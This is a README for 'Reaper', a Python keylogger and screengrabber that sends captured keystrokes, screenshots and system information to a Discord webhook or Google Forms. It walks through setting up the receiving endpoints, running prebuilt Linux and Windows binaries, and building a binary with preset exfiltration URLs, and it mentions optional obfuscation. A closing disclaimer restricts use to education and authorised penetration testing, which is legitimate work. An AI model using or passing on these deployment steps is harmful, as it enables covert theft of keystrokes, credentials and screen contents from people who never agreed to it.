# Reaper - A multi-platform keylogger and screengrabber

![Python Version](https://img.shields.io/badge/python-3.9+-blue?style=for-the-badge&logo=python)
[![CodeFactor Grade](https://img.shields.io/codefactor/grade/github/EONRaider/BCA-Reaper?label=CodeFactor&logo=codefactor&style=for-the-badge)](https://www.codefactor.io/repository/github/EONRaider/BCA-Reaper)
![OS](https://img.shields.io/badge/GNU%2FLinux-red?style=for-the-badge&logo=linux)
![OS](https://img.shields.io/badge/Windows-blue?style=for-the-badge&logo=windows)

[![Reddit](https://img.shields.io/badge/Reddit-EONRaider-FF4500?style=flat-square&logo=reddit)](https://www.reddit.com/user/eonraider)
[![Discord](https://img.shields.io/badge/Discord-EONRaider-7289DA?style=flat-square&logo=discord)](https://discord.gg/KVjWBptv)
[![Twitter](https://img.shields.io/badge/Twitter-eon__raider-38A1F3?style=flat-square&logo=twitter)](https://twitter.com/intent/follow?screen_name=eon_raider)

Reaper is a **multi-platform keylogger, screengrabber and information gatherer** 
written in Python 3. Binaries for Linux and Windows platforms can be built through 
an embedded script that executes PyInstaller.

All captured data is exfiltrated to a **Discord** server and/or **Google Forms** instance through HTTPS.

Linux and Windows binaries are [available](https://github.com/EONRaider/BCA-Reaper/tree/master/dist) 
for portability and ease of execution.

## Demo
![demo]()

## Setup and Build
The only requirements to set up and build are (I) a free Discord server and/or a 
Google Forms instance and (II) building the binary with the URLs as arguments.

### I. Set up a Discord server and/or Google Forms instance
You need at least one of the methods for successful exfiltration.
- **Discord:** Head over to https://www.discord.com and create a new Discord account and 
server, if necessary. [Create a Webhook URL](https://www.digitalocean.com/community/tutorials/how-to-use-discord-webhooks-to-get-notifications-for-your-website-status-on-ubuntu-18-04) 
for any suitable channel and copy the URL.

  ![webhook_Setup](https://github.com/EONRaider/static/blob/49511f621c43ce8a9fac138fa4b14f369edf6cbf/reaper/webhook_setup.png)

- **Google Forms:** Create a form on https://docs.google.com/forms with a free Google account. 
Set up as many questions as you need, with any names. Copy the form URL and that's it. *The 
exfiltration works as long as the answer field for the first question is of type **Paragraph**.*

  ![forms_setup](https://github.com/EONRaider/static/blob/9842916f424823ae8d72f8cd0e73a66371b9bcc7/reaper/forms_setup.png)

### II. Execute
[Download the binaries for Linux/Unix or Windows systems](https://github.com/EONRaider/BCA-Reaper/tree/master/dist) 
from the dist directory and run them with the URLs of your Discord server or Google Forms instance.
```shell
./linux_reaper --webhook YOUR-WEBHOOK-URL --forms YOUR-FORM-URL
```
The same procedure works for the Windows binary.

### III. (Optional) Build your own binary
What if you need a binary ready to exfiltrate to your own **preset Discord and 
GoogleForms URLs** without setting them from the command line?

Building the binary allows you to do just that. You just need to install all dependencies and build. 
Dependency management works with both [Poetry](https://python-poetry.org/) (recommended) and [Virtualenv](https://virtualenv.pypa.io/en/latest/). 
```shell
git clone https://github.com/EONRaider/BCA-Reaper.git
cd BCA-Reaper
poetry install <--or--> pip install -r requirements.txt
```

With all dependencies in place the `build.py` file takes care of the rest.
```shell
python build.py --webhook YOUR-WEBHOOK-URL --forms YOUR-FORM-URL
```
The result is a binary file named `OS-NAME_reaper` that is ready to exfiltrate to your preset URLs 
on execution. Optionally obfuscate and deploy in accordance with your threat emulation activity's ROE. Refer 
to the [Legal Disclaimer](https://github.com/EONRaider/BCA-Reaper/tree/master#legal-disclaimer) 
below.

## Usage
```
usage: reaper.py [-h] [-w <webhook_url>] [-f <google_forms_url>] [-e <seconds>]

BCA Reaper - Log keystrokes, take screenshots, grab system information and exfiltrate to Discord 
and Google Forms

optional arguments:
  -h, --help            show this help message and exit
  -w <webhook_url>, --webhook <webhook_url>
                        URL of a Webhook for the Discord server.
  -f <google_forms_url>, --forms <google_forms_url>
                        URL of a remote instance of Google Forms.
  -e <seconds>, --exfil-time <seconds>
                        Time in seconds to wait between periodic executions of the exfiltration 
                        of logged data. Defaults to 30 seconds. Set to None to perform a 
                        single operation.
```

## Legal Disclaimer

The use of code contained in this repository, either in part or in its totality,
for engaging targets without prior mutual consent is illegal. **It is
the end user's responsibility to obey all applicable local, state and
federal laws.**

Developers assume **no liability** and are not
responsible for misuses or damages caused by any code contained
in this repository in any event that, accidentally or otherwise, it comes to
be utilized by a threat agent or unauthorized entity as a means to compromise
the security, privacy, confidentiality, integrity, and/or availability of
systems and their associated resources. In this context the term "compromise" is
henceforth understood as the leverage of exploitation of known or unknown vulnerabilities
present in said systems, including, but not limited to, the implementation of
security controls, human- or electronically-enabled.

The use of this code is **only** endorsed by the developers in those
circumstances directly related to **educational environments** or
**authorized penetration testing engagements** whose declared purpose is that
of finding and mitigating vulnerabilities in systems, limiting their exposure
to compromises and exploits employed by malicious agents as defined in their
respective threat models.
